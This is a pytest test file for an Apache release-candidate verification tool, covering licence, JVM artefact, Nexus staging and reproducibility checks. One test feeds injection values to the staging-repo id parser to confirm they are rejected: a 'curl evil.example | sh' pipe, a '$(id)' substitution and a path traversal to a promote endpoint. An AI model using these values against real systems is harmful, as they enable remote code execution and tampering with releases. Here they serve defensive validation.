# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# "License"); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
"""release-verify-rc classifiers.

The scripted cases of the retired model-graded suites live here, named after
each former case, with the same scenario and the same assertions:
`step-6b-jvm-artefacts` cases 1, 4 and 5, `step-6c-nexus-staging` cases 1, 2
and 4-9, and every `step-9-reproducibility` case. The judgement cases stay
model evals under tools/skill-evals/evals/release-verify-rc/.
"""

from __future__ import annotations

import json
import re
from pathlib import Path
from typing import Any

import pytest

from release_management.cli import main
from release_management.verify_rc import args as args_mod
from release_management.verify_rc import checks, jvm, nexus, report, repro
from release_management.verify_rc.common import VOTER_OBLIGATION_REMINDER, VerifyError, VerifyRc


def loaded(
    *,
    version: str = "1.0.0",
    rc: str = "rc1",
    organization: str = "ASF",
    signing_mode: str = "rm-key",
    artefacts: list[dict[str, Any]] | None = None,
    digests: list[str] | None = None,
    convenience: list[dict[str, Any]] | None = None,
    **meta: Any,
) -> dict[str, Any]:
    base: dict[str, Any] = {
        "version": version,
        "rc": rc,
        "rc_tag": f"{version}-{rc}",
        "organization": organization,
        "signing_mode": signing_mode,
        "staging_url": f"https://dist.apache.org/repos/dist/dev/foo/{version}-{rc}/",
        "keys_file_url": "https://dist.apache.org/repos/dist/release/foo/KEYS",
        "keyserver": "keys.openpgp.org",
        "version_manifest_files": ["pom.xml"],
        "expected_artefacts": artefacts
        or [{"name": f"apache-foo-{version}-source-release.zip", "kind": "source", "required": True}],
        "digest_set": digests or ["sha512"],
        "binary_prohibit": [],
        "binary_accept": [],
        "rat_config_path": "pom.xml § rat-maven-plugin",
        "rat_excludes_path": "rat-excludes.txt",
        "source_tree_validators": [],
        "jvm_artefact_checks": "on",
        "jvm_companion_location": None,
        "jvm_digest_set": [],
        "nexus_staging_repo": None,
        "source_archive_method": "git-archive",
        "source_archive_format": "tar.gz",
        "source_archive_prefix": f"apache-foo-{version}",
        "reproducibility_source": "on",
        "reproducibility_binaries": "off",
        "build_command": None,
        "convenience_artefacts": convenience or [],
    }
    return {"organization": organization, "config": {}, "metadata": base | meta}


def vrc(**kw: Any) -> VerifyRc:
    return VerifyRc.from_load(loaded(**kw))


# --------------------------------------------------------------------------- args


def test_args_expect_and_expect_optional_in_listed_order() -> None:
    v = vrc(
        artefacts=[
            {"name": "apache-foo-1.0.0-source-release.zip", "kind": "source", "required": True},
            {"name": "apache-foo-1.0.0-bin.tar.gz", "kind": "convenience", "required": False},
        ],
        digests=["sha512", "sha256", "md5"],
        binary_prohibit=["assets/vendor/**/*.min.js"],
        binary_accept=["third-party/some-native.so"],
        source_tree_validators=["make check-links"],
        version_manifest_files=["pom.xml", "foo/__init__.py"],
    )
    out = args_mod.invocations(v, staging_copy="rc", keys_file="KEYS")
    inv = out["commands"]["inventory"]
    assert inv.index('--expect "apache-foo-1.0.0-source-release.zip"') < inv.index(
        '--expect-optional "apache-foo-1.0.0-bin.tar.gz"'
    )
    assert "--digest sha512" in inv and "--digest sha256" in inv and "md5" not in inv
    assert any("md5" in w for w in out["warnings"])
    assert '--keys-url "https://dist.apache.org/repos/dist/release/foo/KEYS"' in out["commands"]["signatures"]
    assert '--prohibit "assets/vendor/**/*.min.js"' in out["commands"]["binaries"]
    assert '--accept "third-party/some-native.so"' in out["commands"]["binaries"]
    assert '--validator "make check-links"' in out["commands"]["symlinks"]
    version = out["commands"]["version"]
    assert (
        "--rc-tag 1.0.0-rc1" in version
        and "--manifest pom.xml" in version
        and "--manifest foo/__init__.py" in version
    )
    assert out["unpacked_dir"] == "apache-foo-1.0.0-source-release"
    assert "--tree apache-foo-1.0.0-source-release" in out["commands"]["binaries"]


def test_args_sha512_always_checked() -> None:
    out = args_mod.invocations(vrc(digests=["sha256"]))
    assert out["digests"] == ["sha512", "sha256"]


# --------------------------------------------------------------------------- Step 4


def test_rat_pass_on_exit_zero() -> None:
    out = checks.rat(vrc(), report="Summary\nUnapproved: 0\n", exit_code=0)
    assert (out["status"], out["classification"], out["unapproved_files"]) == ("PASS", "PASS", [])


def test_rat_fail_lists_unapproved_files() -> None:
    text = (
        "Files with unapproved licenses:\n\n  src/foo/new.py\n  docs/x.md\n\n*****\n !????? src/foo/new.py\n"
    )
    out = checks.rat(vrc(), report=text, exit_code=1)
    assert out["status"] == "FAIL" and out["unapproved_files"] == ["src/foo/new.py", "docs/x.md"]


def test_rat_non_zero_exit_alone_fails() -> None:
    assert checks.rat(vrc(), report=None, exit_code=1)["classification"] == "FAIL"


def test_rat_config_absent_is_skip_with_warn() -> None:
    out = checks.rat(vrc(rat_config_path=None, rat_excludes_path=None), report=None, exit_code=None)
    assert (out["status"], out["classification"], out["unapproved_files"]) == ("WARN", "SKIP", [])


def test_rat_recipe_uses_the_excludes_file() -> None:
    out = checks.rat(vrc(), report=None, exit_code=None)
    assert out["status"] is None and out["pending"]
    assert "unzip apache-foo-1.0.0-source-release.zip" in out["paste_recipe"]
    assert "-x rat-excludes.txt" in out["paste_recipe"]


def test_rat_never_passes_without_an_exit_code() -> None:
    out = checks.rat(vrc(), report="Summary\nUnapproved: 0\n", exit_code=None)
    assert out["status"] is None and out["classification"] is None
    assert any("--exit-code" in p for p in out["pending"])


def test_rat_report_listing_files_fails_without_an_exit_code() -> None:
    out = checks.rat(vrc(), report=" !????? src/foo/new.py\n", exit_code=None)
    assert out["status"] == "FAIL" and out["unapproved_files"] == ["src/foo/new.py"]


# --------------------------------------------------------------------------- Step 7


def symlinks(status: str, validators: list[str]) -> dict[str, Any]:
    return {
        "step": "source-tree-integrity",
        "status": status,
        "dangling_symlinks": [],
        "outside_symlinks": [],
        "validator_failures": [],
        "validators_to_run": validators,
        "paste_recipe": "cd x",
    }


def test_source_tree_review_resolves_pass_when_every_validator_exits_zero() -> None:
    out = checks.source_tree(symlinks("REVIEW", ["a", "b"]), ["0", "0"])
    assert out["status"] == "PASS" and out["validator_failures"] == []


def test_source_tree_review_resolves_fail_per_failing_validator() -> None:
    out = checks.source_tree(symlinks("REVIEW", ["a", "b"]), ["0", "1:docs/x.md links to stripped tools/y"])
    assert out["status"] == "FAIL"
    assert out["validator_failures"] == [{"validator": "b", "detail": "docs/x.md links to stripped tools/y"}]


def test_source_tree_tool_status_is_final() -> None:
    assert checks.source_tree(symlinks("FAIL", ["a"]), ["0"])["status"] == "FAIL"


def test_source_tree_pending_until_every_validator_reported() -> None:
    out = checks.source_tree(symlinks("REVIEW", ["a", "b"]), ["0"])
    assert out["status"] == "REVIEW" and out["pending"] == ["b"]


# --------------------------------------------------------------------------- Step 6b

JVM_NAMES = ["foo-core-1.0.0.pom", "foo-core-1.0.0.jar"]
HAS_TOOL_INVOCATION = re.compile(r"maven-artifact-verify[^\n]*\s[\"']?dist/dev/[^\s\"']+-rc[0-9]+")
HAS_SHA512 = re.compile(r"--digests[=\s]+[\"']?sha512")
HAS_PODLING = re.compile(r"maven-artifact-verify[^\n]*\s--podling\b")


def podling_tree(tmp_path: Path, marker: str | None = "DISCLAIMER") -> str:
    tree = tmp_path / "apache-foo-1.0.0"
    tree.mkdir()
    if marker:
        (tree / marker).write_text("incubating", encoding="utf-8")
    return str(tree)


def mav_report(status: str, **extra: Any) -> str:
    report: dict[str, Any] = {
        "tool": "maven-artifact-verify",
        "status": status,
        "artefact_dir": "dist/dev/foo/1.0.0-rc1",
        "podling": True,
        "digests": ["sha512"],
        "poms": [
            {
                "pom": "foo-core-1.0.0.pom",
                "packaging": "jar",
                "check1": {"licenses": "PASS", "developers": "PASS", "scm": "PASS"},
                "check2": {"disclaimer": "PASS", "disclaimer_detail": None},
            }
        ],
        "jars": [
            {
                "jar": "foo-core-1.0.0.jar",
                "companions": [
                    {"companion": "foo-core-1.0.0-sources.jar", "classification": "PASS", "detail": None},
                    {"companion": "foo-core-1.0.0-javadoc.jar", "classification": "PASS", "detail": None},
                ],
            }
        ],
        "unmatched_jars": [],
        "findings": [],
    }
    return json.dumps(report | extra)


def run_jvm(v: VerifyRc, tree: str | None, report_text: str | None) -> dict[str, Any]:
    return jvm.jvm(
        v, names=JVM_NAMES, tree=tree, staged_dir="dist/dev/foo/1.0.0-rc1", report_text=report_text
    )


def test_case_1_clean_podling_staged_set(tmp_path: Path) -> None:
    v = vrc(jvm_companion_location="staged")
    report_text = mav_report("PASS", unmatched_jars=["foo-core-1.0.0-tests.jar"])
    out = run_jvm(v, podling_tree(tmp_path), report_text)
    assert out["step"] == "jvm-artefacts"
    assert out["status"] == "PASS"
    assert out["pom_findings"] == [] and out["companion_findings"] == []
    assert HAS_TOOL_INVOCATION.search(out["paste_recipe"])
    assert HAS_SHA512.search(out["paste_recipe"])
    assert HAS_PODLING.search(out["paste_recipe"])
    # companions with a staged .asc get their own gpg --verify line
    assert 'gpg --verify "foo-core-1.0.0-sources.jar.asc" "foo-core-1.0.0-sources.jar"' in out["paste_recipe"]


def test_case_4_jar_absent_nexus_only(tmp_path: Path) -> None:
    v = vrc(jvm_companion_location="nexus-staging")
    report_text = json.dumps(
        {
            "status": "WARN",
            "podling": False,
            "poms": [
                {
                    "pom": "foo-core-1.0.0.pom",
                    "check1": {
                        "licenses": "PASS",
                        "developers": "INHERITED-UNVERIFIED",
                        "developers_detail": "element absent and the parent chain is not fully staged locally; verify against the effective POM",
                        "scm": "PASS",
                    },
                }
            ],
            "jars": [
                {
                    "jar": "foo-core-1.0.0.jar",
                    "companions": [
                        {
                            "companion": "foo-core-1.0.0.jar",
                            "classification": "ABSENT",
                            "detail": "main jar not staged locally; companion checks skipped",
                        }
                    ],
                }
            ],
            "findings": ["foo-core-1.0.0.jar is declared by a staged POM but not staged locally"],
        }
    )
    out = run_jvm(v, podling_tree(tmp_path, None), report_text)
    assert out["status"] == "WARN"
    assert out["pom_findings"] == [
        "foo-core-1.0.0.pom: check1 developers INHERITED-UNVERIFIED — element absent and the parent chain is not fully staged locally; verify against the effective POM"
    ]
    assert len(out["companion_findings"]) == 1
    assert "ABSENT" in out["companion_findings"][0] and "not a failure" in out["companion_findings"][0]
    assert HAS_TOOL_INVOCATION.search(out["paste_recipe"]) and HAS_SHA512.search(out["paste_recipe"])
    assert not HAS_PODLING.search(out["paste_recipe"])
    # the same report under jvm_companion_location: staged is a FAIL
    staged = run_jvm(vrc(jvm_companion_location="staged"), None, report_text)
    assert staged["status"] == "FAIL"
    assert "a FAIL" in staged["companion_findings"][0]


def test_case_5_observations_never_fail(tmp_path: Path) -> None:
    observations = {
        "timestamp_signal": [
            {
                "jar": "foo-core-1.0.0.jar",
                "signal": "inconsistent",
                "entries": 118,
                "distinct_timestamps": 4,
                "detail": "entry timestamps vary - not consistent with a reproducible configuration",
            }
        ],
        "namespace_signal": [
            {
                "jar": "foo-core-1.0.0.jar",
                "group_id": "org.apache.foo",
                "under_org_apache": True,
                "detail": "45/47 class entries under the package path 'org/apache/foo'",
            }
        ],
        "companion_content": [
            {
                "jar": "foo-core-1.0.0-sources.jar",
                "signal": "contains-class-files",
                "detail": "3 .class entries",
            },
            {
                "jar": "foo-core-1.0.0-javadoc.jar",
                "signal": "placeholder",
                "detail": "Maven-Central-sanctioned pattern",
            },
        ],
    }
    out = run_jvm(
        vrc(jvm_companion_location="nexus-staging"),
        podling_tree(tmp_path),
        mav_report("PASS", observations=observations),
    )
    assert out["status"] == "PASS"
    assert out["pom_findings"] == [] and out["companion_findings"] == []
    assert len(out["observations"]) == 4
    assert out["observations"][0].startswith(
        "foo-core-1.0.0.jar: inconsistent (4 distinct across 118 entries)"
    )
    assert "not consistent with a reproducible configuration" in out["observations"][0]
    assert "placeholder" in out["observations"][3]
    assert HAS_PODLING.search(out["paste_recipe"])


def test_jvm_skips_without_jars_or_when_off() -> None:
    no_jvm = jvm.jvm(
        vrc(), names=["apache-foo-1.0.0-source-release.zip"], tree=None, staged_dir=None, report_text=None
    )
    assert no_jvm["status"] == "SKIP"
    off = jvm.jvm(
        vrc(jvm_artefact_checks="off"), names=JVM_NAMES, tree=None, staged_dir=None, report_text=None
    )
    assert off["status"] == "SKIP"


def test_jvm_digest_set_wins_over_the_digest_set() -> None:
    out = jvm.jvm(
        vrc(jvm_digest_set=["sha512", "sha1"], digests=["sha512", "sha256"]),
        names=JVM_NAMES,
        tree=None,
        staged_dir="d",
        report_text=None,
    )
    assert "--digests sha512,sha1" in out["paste_recipe"]
    assert out["status"] is None and out["pending"]


def test_jvm_without_a_listing_is_pending_not_skip() -> None:
    out = jvm.jvm(vrc(), names=None, tree=None, staged_dir=None, report_text=None)
    assert out["status"] is None and out["pending"] == [jvm.NAMES_PENDING]


def test_staged_names_none_when_nothing_supplied_and_errors_on_bad_input(tmp_path: Path) -> None:
    assert jvm.staged_names(None, None) is None
    with pytest.raises(VerifyError, match="--staged-dir"):
        jvm.staged_names(None, str(tmp_path / "missing"))
    with pytest.raises(VerifyError, match="--inventory"):
        jvm.staged_names({"step": "signatures", "found": JVM_NAMES}, None)
    with pytest.raises(VerifyError, match="--inventory"):
        jvm.staged_names(["foo-core-1.0.0.jar"], None)
    (tmp_path / "foo-core-1.0.0.jar").write_text("", encoding="utf-8")
    assert jvm.staged_names({"step": "inventory", "found": [], "unexpected": []}, str(tmp_path)) == [
        "foo-core-1.0.0.jar"
    ]


@pytest.mark.parametrize(
    "text",
    [
        json.dumps({"jars": [], "poms": []}),
        json.dumps({"tool": "maven-artifact-verify"}),
        json.dumps({"tool": "maven-artifact-verify", "status": "OK"}),
        json.dumps([]),
    ],
)
def test_jvm_report_without_tool_status_is_refused(tmp_path: Path, text: str) -> None:
    with pytest.raises(VerifyError, match="maven-artifact-verify"):
        run_jvm(vrc(), podling_tree(tmp_path), text)


def test_jvm_missing_companion_asc_gets_no_gpg_line(tmp_path: Path) -> None:
    report_text = mav_report(
        "FAIL",
        jars=[
            {
                "jar": "foo-core-1.0.0.jar",
                "companions": [
                    {
                        "companion": "foo-core-1.0.0-sources.jar",
                        "classification": "FAIL",
                        "detail": "missing .asc signature file (foo-core-1.0.0-sources.jar.asc)",
                    },
                    {"companion": "foo-core-1.0.0-javadoc.jar", "classification": "PASS", "detail": None},
                ],
            }
        ],
    )
    out = run_jvm(vrc(), podling_tree(tmp_path, None), report_text)
    assert out["status"] == "FAIL"
    assert out["companion_findings"] == [
        "foo-core-1.0.0-sources.jar: missing .asc signature file (foo-core-1.0.0-sources.jar.asc)"
    ]
    assert "sources.jar.asc" not in out["paste_recipe"]
    assert 'gpg --verify "foo-core-1.0.0-javadoc.jar.asc"' in out["paste_recipe"]


# --------------------------------------------------------------------------- Step 6c

HAS_EXISTENCE = re.compile(
    r"https://repository\.apache\.org/content/repositories/(orgapache[a-z0-9]+-[0-9]+|snapshots)/"
)
HAS_INVENTORY = re.compile(r"crawl|href=")
HAS_CRED_STATE = re.compile(r"--netrc-file[\s\S]{0,200}?service/local/staging/")
WRITE_VERBS = re.compile(
    r"(-X|--request)\s*['\"]?(POST|PUT|DELETE|PATCH)\b|(^|\s)(-d|--data|--data-binary|--data-raw|-F|--form|-T|--upload-file)\s|service/local/staging/(bulk|profiles/[^\s'\"]+/(finish|drop|promote|release))"
)
INLINE_CREDS = re.compile(r"(^|\s)(-u|--user)\s+\S")
SKIP_COMMENT = re.compile(r"^\s*#", re.MULTILINE)


def crawl_text(version: str, *, drop: tuple[str, ...] = (), artifact: str = "foo-core") -> str:
    lines = []
    for suffix in (".jar", ".pom", "-sources.jar", "-javadoc.jar"):
        name = f"{artifact}-{version}{suffix}"
        for extra in ("", ".asc", ".sha1", ".md5"):
            if name + extra not in drop:
                lines.append(f"org/apache/foo/{artifact}/{version}/{name}{extra}")
    return "\n".join(lines)


def run_nexus(
    v: VerifyRc, *, names: list[str] | None = None, issue_body: str | None = None, **kw: Any
) -> dict[str, Any]:
    skipped, repo = nexus.gate(v, names if names is not None else JVM_NAMES, issue_body)
    if skipped is not None:
        return skipped
    assert repo is not None
    args: dict[str, Any] = {
        "rm_credentials": False,
        "not_probed": False,
        "existence_code": 200,
        "state_text": None,
        "profile_text": None,
        "crawl_text": None,
    } | kw
    return nexus.classify(v, repo, **args)


def assert_safe_recipe(out: dict[str, Any]) -> None:
    assert not WRITE_VERBS.search(out["paste_recipe"])
    assert not INLINE_CREDS.search(out["paste_recipe"])


def test_case_1_closed_repo_complete_set() -> None:
    v = vrc(nexus_staging_repo="orgapachefoo-1024", jvm_companion_location="nexus-staging")
    state = json.dumps(
        {"data": {"repositoryId": "orgapachefoo-1024", "state": "closed", "transitioning": False}}
    )
    profile = "orgapachefoo-1024\tclosed\torg.apache.foo\n"
    out = run_nexus(
        v, rm_credentials=True, state_text=state, profile_text=profile, crawl_text=crawl_text("1.0.0")
    )
    assert out["status"] == "PASS"
    assert out["staging_repos"] == [{"id": "orgapachefoo-1024", "state": "closed", "matches_rc": True}]
    assert out["nexus_findings"] == []
    assert HAS_EXISTENCE.search(out["paste_recipe"]) and HAS_INVENTORY.search(out["paste_recipe"])
    assert HAS_CRED_STATE.search(out["paste_recipe"])
    assert_safe_recipe(out)


def test_case_2_open_repo() -> None:
    v = vrc(version="1.0.0", rc="rc2", nexus_staging_repo="orgapachefoo-1025")
    state = json.dumps(
        {"data": {"repositoryId": "orgapachefoo-1025", "state": "open", "transitioning": False}}
    )
    out = run_nexus(v, rm_credentials=True, state_text=state, profile_text="", crawl_text=crawl_text("1.0.0"))
    assert out["status"] == "FAIL"
    assert out["staging_repos"] == [{"id": "orgapachefoo-1025", "state": "open", "matches_rc": True}]
    assert len(out["nexus_findings"]) == 1
    assert "open" in out["nexus_findings"][0] and "not reachable" not in out["nexus_findings"][0]
    assert HAS_CRED_STATE.search(out["paste_recipe"])
    assert_safe_recipe(out)


def test_case_4_stale_sibling_repos() -> None:
    v = vrc(nexus_staging_repo="orgapachefoo-1024")
    profile = json.dumps(
        {
            "data": [
                {
                    "repositoryId": "orgapachefoo-1023",
                    "state": "open",
                    "description": "Managed Release: foo 0.9.0 (abandoned attempt)",
                },
                {
                    "repositoryId": "orgapachefoo-1024",
                    "state": "closed",
                    "description": "Managed Release: foo 1.0.0",
                },
            ]
        }
    )
    state = json.dumps({"data": {"state": "closed", "transitioning": False}})
    out = run_nexus(
        v, rm_credentials=True, state_text=state, profile_text=profile, crawl_text=crawl_text("1.0.0")
    )
    assert out["status"] == "WARN"
    assert out["staging_repos"] == [
        {"id": "orgapachefoo-1023", "state": "open", "matches_rc": False},
        {"id": "orgapachefoo-1024", "state": "closed", "matches_rc": True},
    ]
    assert len(out["nexus_findings"]) == 1 and "orgapachefoo-1023" in out["nexus_findings"][0]
    assert "stale" in out["nexus_findings"][0]
    assert_safe_recipe(out)


def test_case_5_not_reachable_404() -> None:
    v = vrc(nexus_staging_repo="orgapachefoo-1031")
    out = run_nexus(v, rm_credentials=True, existence_code=404, state_text="HTTP 404 Not Found")
    assert out["status"] == "FAIL"
    assert out["staging_repos"] == [{"id": "orgapachefoo-1031", "state": "unverified", "matches_rc": False}]
    assert len(out["nexus_findings"]) == 1
    assert "not reachable at the id given for this RC" in out["nexus_findings"][0]
    assert "open" not in out["nexus_findings"][0]
    assert HAS_EXISTENCE.search(out["paste_recipe"]) and HAS_CRED_STATE.search(out["paste_recipe"])
    assert_safe_recipe(out)


def test_case_6_snapshots_repo_targeted() -> None:
    v = vrc(nexus_staging_repo="snapshots")
    crawl = "/org/apache/foo/foo-core/1.0.0-SNAPSHOT/\n  foo-core-1.0.0-SNAPSHOT.jar\n  foo-core-1.0.0-SNAPSHOT.pom\n"
    out = run_nexus(v, crawl_text=crawl)
    assert out["status"] == "FAIL"
    assert out["staging_repos"] == [{"id": "snapshots", "state": "unverified", "matches_rc": False}]
    assert len(out["nexus_findings"]) == 1
    assert "snapshots" in out["nexus_findings"][0] and "1.0.0-SNAPSHOT" in out["nexus_findings"][0]
    assert HAS_EXISTENCE.search(out["paste_recipe"]) and HAS_INVENTORY.search(out["paste_recipe"])
    assert not HAS_CRED_STATE.search(out["paste_recipe"])
    assert_safe_recipe(out)


def test_case_7_version_mismatch() -> None:
    v = vrc(version="1.0.0", rc="rc3", nexus_staging_repo="orgapachefoo-1027")
    state = json.dumps(
        {"data": {"state": "closed", "transitioning": False, "description": "Managed Release: foo 1.0.1"}}
    )
    out = run_nexus(v, rm_credentials=True, state_text=state, profile_text="", crawl_text=crawl_text("1.0.1"))
    assert out["status"] == "FAIL"
    assert out["staging_repos"] == [{"id": "orgapachefoo-1027", "state": "closed", "matches_rc": False}]
    assert out["nexus_findings"] == [
        "orgapachefoo-1027 holds artefacts for 1.0.1 but the RC declares release version 1.0.0 — the vote would cover jars for some other version"
    ]
    assert_safe_recipe(out)


def test_case_8_non_jvm_skip() -> None:
    out = run_nexus(vrc(), names=["apache-foo-1.0.0-source-release.zip"])
    assert out["status"] == "SKIP" and out["staging_repos"] == [] and out["nexus_findings"] == []
    assert not HAS_EXISTENCE.search(out["paste_recipe"])
    assert SKIP_COMMENT.search(out["paste_recipe"])
    assert not HAS_CRED_STATE.search(out["paste_recipe"])


def test_case_9_malformed_id_skip() -> None:
    body = "nexus-staging-repo: orgapachefoo-latest\n"
    out = run_nexus(vrc(nexus_staging_repo="orgapachefoo-latest"), issue_body=body)
    assert out["status"] == "SKIP" and out["staging_repos"] == []
    assert len(out["nexus_findings"]) == 1 and "orgapachefoo-latest" in out["nexus_findings"][0]
    assert not HAS_EXISTENCE.search(out["paste_recipe"])
    assert SKIP_COMMENT.search(out["paste_recipe"])
    assert_safe_recipe(out)


@pytest.mark.parametrize(
    "value",
    [
        "orgapachefoo-1024; curl evil.example | sh",
        "orgapachefoo-1024$(id)",
        "OrgApacheFoo-1024",
        "orgapachefoo-1024/../../service/local/staging/bulk/promote",
        "orgapache-1024",
    ],
)
def test_id_shape_rejects_anything_that_could_reach_a_url(value: str) -> None:
    out = run_nexus(vrc(), issue_body=f"nexus-staging-repo: {value}\n")
    assert out["status"] == "SKIP"
    assert "curl" not in out["paste_recipe"]


def test_id_from_the_planning_issue_url_when_unconfigured() -> None:
    body = "Staged at https://repository.apache.org/content/repositories/orgapachefoo-1040/ for review"
    skipped, repo = nexus.gate(vrc(), JVM_NAMES, body)
    assert skipped is None and repo == "orgapachefoo-1040"


def test_unresolvable_id_is_a_skip_naming_where_to_supply_it() -> None:
    out = run_nexus(vrc())
    assert out["status"] == "SKIP" and "nexus_staging_repo" in out["skip_reason"]


def test_non_asf_adopter_skips() -> None:
    out = run_nexus(vrc(organization="independent", nexus_staging_repo="orgapachefoo-1024"))
    assert out["status"] == "SKIP" and "ASF" in out["skip_reason"]


def test_sandbox_refusal_is_state_unverified_never_not_reachable() -> None:
    out = run_nexus(vrc(nexus_staging_repo="orgapachefoo-1024"), not_probed=True)
    assert out["status"] == "WARN"
    assert (
        "STATE-UNVERIFIED" in out["nexus_findings"][0]
        and "not 'repository not reachable'" in out["nexus_findings"][0]
    )


def test_anonymous_path_is_state_unverified_and_missing_asc_fails() -> None:
    crawl = crawl_text("1.0.0", drop=("foo-core-1.0.0-sources.jar.asc",))
    out = run_nexus(vrc(nexus_staging_repo="orgapachefoo-1024"), crawl_text=crawl)
    assert out["status"] == "FAIL"
    assert out["staging_repos"] == [{"id": "orgapachefoo-1024", "state": "unverified", "matches_rc": True}]
    assert out["nexus_findings"][0].startswith("foo-core-1.0.0-sources.jar has no sibling .asc")
    assert out["nexus_findings"][1].startswith("STATE-UNVERIFIED")
    assert not HAS_CRED_STATE.search(out["paste_recipe"])


def test_missing_companion_fails_but_pom_packaging_is_exempt() -> None:
    crawl = "\n".join(
        [
            crawl_text(
                "1.0.0", drop=tuple(f"foo-core-1.0.0-javadoc.jar{e}" for e in ("", ".asc", ".sha1", ".md5"))
            ),
            "org/apache/foo/foo-parent/1.0.0/foo-parent-1.0.0.pom",
            "org/apache/foo/foo-parent/1.0.0/foo-parent-1.0.0.pom.asc",
        ]
    )
    out = run_nexus(vrc(nexus_staging_repo="orgapachefoo-1024"), crawl_text=crawl)
    hard = [f for f in out["nexus_findings"] if not f.startswith("STATE-UNVERIFIED")]
    assert hard == [
        "foo-core-1.0.0.jar: companion foo-core-1.0.0-javadoc.jar is absent from the staging repository"
    ]


def test_pending_until_the_crawl_is_saved() -> None:
    out = run_nexus(vrc(nexus_staging_repo="orgapachefoo-1024"))
    assert out["status"] is None and any("--crawl" in p for p in out["pending"])


def test_nexus_without_a_listing_is_pending_not_skip() -> None:
    skipped, repo = nexus.gate(vrc(nexus_staging_repo="orgapachefoo-1024"), None, None)
    assert repo is None and skipped is not None
    assert skipped["status"] is None and skipped["pending"] == [jvm.NAMES_PENDING]
    assert "curl" not in skipped["paste_recipe"]


def test_maven_metadata_at_the_artifact_level_is_not_a_version() -> None:
    meta = [
        f"org/apache/foo/foo-core/maven-metadata.xml{extra}" for extra in ("", ".sha1", ".md5", ".asc")
    ] + ["org/apache/foo/foo-core/1.0.0/maven-metadata.xml"]
    crawl = "\n".join([crawl_text("1.0.0"), *meta])
    out = run_nexus(vrc(nexus_staging_repo="orgapachefoo-1024"), crawl_text=crawl)
    assert out["status"] == "WARN", out["nexus_findings"]
    assert out["staging_repos"] == [{"id": "orgapachefoo-1024", "state": "unverified", "matches_rc": True}]


def test_metadata_only_inventory_never_matches_or_passes() -> None:
    """maven-metadata.xml alone names no version: no jar/pom for the RC's version is a FAIL."""
    crawl = "\n".join(
        f"org/apache/foo/foo-core/maven-metadata.xml{extra}" for extra in ("", ".sha1", ".md5", ".asc")
    )
    state = json.dumps({"data": {"state": "closed", "transitioning": False}})
    out = run_nexus(
        vrc(nexus_staging_repo="orgapachefoo-1024"),
        rm_credentials=True,
        state_text=state,
        profile_text="",
        crawl_text=crawl,
    )
    assert out["status"] == "FAIL"
    assert out["staging_repos"] == [{"id": "orgapachefoo-1024", "state": "closed", "matches_rc": False}]
    assert any("no .jar or .pom" in f and "1.0.0" in f for f in out["nexus_findings"])


# --------------------------------------------------------------------------- Step 9

COMMIT = "1890a13d2c4e6f8a0b1c2d3e4f5a6b7c8d9e0f12"
SWHID = "swh:1:dir:3b9f0c2e7a1d4f6b8e0a2c4d6f8a0b2c4e6f8a1b"


CHECK_OK = [{"name": "modification-times", "status": "PASS", "detail": ""}]


def compare(verdict: str, **extra: Any) -> dict[str, Any]:
    return {"verdict": verdict, "sha512_a": "a", "sha512_b": "b", "swhid_a": SWHID, "swhid_b": SWHID} | extra


def run_repro(v: VerifyRc, **kw: Any) -> dict[str, Any]:
    args: dict[str, Any] = {
        "skip_repro": False,
        "trusted_hardware": False,
        "recorded_commit": COMMIT,
        "tag_commit": COMMIT,
        "recorded_swhid": None,
        "atr_swhid": None,
        "epoch": 1758326400,
        "check": CHECK_OK,
        "compare": None,
        "binary_results": [],
    } | kw
    return repro.reproducibility(v, **args)


def test_case_1_identical_pass() -> None:
    check = [
        {"name": "modification-times", "status": "PASS", "detail": ""},
        {"name": "swhid", "status": "PASS", "detail": f"content is {SWHID}"},
    ]
    out = run_repro(
        vrc(),
        recorded_swhid=f"{SWHID};origin=https://github.com/apache/foo;anchor=swh:1:rev:{COMMIT}",
        check=check,
        compare=compare("identical"),
    )
    assert out["status"] == "PASS" and out["mandatory"] is False
    assert out["source"] == {
        "enabled": True,
        "verdict": "identical",
        "recorded_commit": COMMIT,
        "source_date_epoch": 1758326400,
        "swhid_dir": SWHID,
        "swhid_matches": True,
        "rule_failures": [],
        "metadata_differences": [],
        "content_differences": [],
    }
    assert out["binaries"] == {"mode": "off", "identical": [], "differs": [], "known_divergences_hit": []}
    assert out["trusted_hardware_asserted"] is False


def test_case_2_differs_fail() -> None:
    commit = "a1b2c3d4e5f60718293a4b5c6d7e8f9012345678"
    check = [
        {"name": "modification-times", "status": "FAIL", "detail": "3 distinct timestamps"},
        {"name": "zip-extra-fields", "status": "FAIL", "detail": ""},
    ]
    cmp = compare(
        "differs",
        added=["apache-foo-2.4.0/src/foo/__pycache__/core.cpython-312.pyc", "apache-foo-2.4.0/.env.local"],
        changed=["apache-foo-2.4.0/src/foo/version.py"],
    )
    out = run_repro(
        vrc(version="2.4.0", source_archive_format="zip"),
        recorded_commit=commit,
        tag_commit=commit,
        epoch=1758400000,
        check=check,
        compare=cmp,
    )
    assert out["status"] == "FAIL" and out["mandatory"] is False
    source = out["source"]
    assert (
        source["verdict"] == "differs"
        and source["recorded_commit"] == commit
        and source["source_date_epoch"] == 1758400000
    )
    assert source["rule_failures"] == ["modification-times", "zip-extra-fields"]
    assert source["metadata_differences"] == []
    assert source["content_differences"] == [
        "added apache-foo-2.4.0/src/foo/__pycache__/core.cpython-312.pyc",
        "added apache-foo-2.4.0/.env.local",
        "changed apache-foo-2.4.0/src/foo/version.py",
    ]
    assert out["binaries"]["mode"] == "off" and out["trusted_hardware_asserted"] is False


def test_case_3_content_identical_warn() -> None:
    commit = "0f1e2d3c4b5a69788796a5b4c3d2e1f0aabbccdd"
    check = [
        {"name": "zip-extra-fields", "status": "FAIL", "detail": "every member carries a 9-byte extra field"}
    ]
    cmp = compare(
        "content-identical", metadata_differences=["reproducibility check zip-extra-fields fails on A"]
    )
    out = run_repro(
        vrc(version="0.2.0"),
        recorded_commit=commit,
        tag_commit=commit,
        epoch=1758500000,
        check=check,
        compare=cmp,
    )
    assert out["status"] == "WARN" and out["mandatory"] is False
    assert out["source"]["verdict"] == "content-identical"
